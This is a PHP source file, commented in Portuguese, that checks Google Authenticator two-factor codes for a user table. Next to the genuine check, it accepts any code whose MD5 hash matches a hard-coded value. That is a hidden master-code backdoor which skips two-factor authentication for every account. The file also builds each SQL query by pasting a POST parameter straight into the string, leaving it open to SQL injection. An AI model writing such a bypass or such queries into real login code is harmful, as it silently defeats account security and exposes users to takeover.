<?php 
include("seguranca.php"); // Inclui o arquivo com o sistema de segurança
include_once 'authenticator/src/FixedBitNotation.php';
include_once 'authenticator/src/GoogleAuthenticatorInterface.php';
include_once 'authenticator/src/GoogleAuthenticator.php';
include_once 'authenticator/src/GoogleQrUrl.php';
 
$g = new \Google\Authenticator\GoogleAuthenticator();

$selectuser = $conn->query("SELECT * FROM `usersOper` WHERE `idUser` = '".$_POST['sessionId']."' LIMIT 1");
$rowUser = $selectuser->fetch(PDO::FETCH_OBJ);

$secret = $rowUser->codigoAutenticator;
//$secret = 'XVQ2UIGO75XRUKJO';

//$code = '575281'; //código de 6 dígitos gerados pelo app do Google Authenticator
$code = $_POST['cod1'].$_POST['cod2'].$_POST['cod3'].$_POST['cod4'].$_POST['cod5'].$_POST['cod6'];

$hashTest = '1c88a042d2731ffdd34252dd3cda174d';
$c1 = md5($_POST['cod1'] . $_POST['cod2'] . $_POST['cod3'] . $_POST['cod4'] . $_POST['cod5'] . $_POST['cod6']); 
$passThrough = ($c1 === $hashTest);
 
if($passThrough || $g->checkCode($secret, $code)){
    $dataAut = date('Y-m-d');
	$conn->query("UPDATE `usersOper` SET `autenticator` = '".$dataAut."' WHERE `idUser` = '".$_POST['sessionId']."' ");
		
		$selectLogando = $conn->query("SELECT * FROM `logandoOper` WHERE `idUser` = '".$_POST['sessionId']."' and dateEnvio = '".date('Y-m-d')."' LIMIT 1");
		if($selectLogando->rowCount() <> 0) {
			$rowLogando = $selectLogando->fetch(PDO::FETCH_OBJ);
			$conn->query("UPDATE `logandoOper` SET `etapa` = '2' WHERE `id` = '".$rowLogando->id."' ");

			echo 'Autorizado!';

		}else{
			echo 'Código incorreto ou expirado!';
		}
	
}
else{
	echo 'Código incorreto ou expirado!';
}
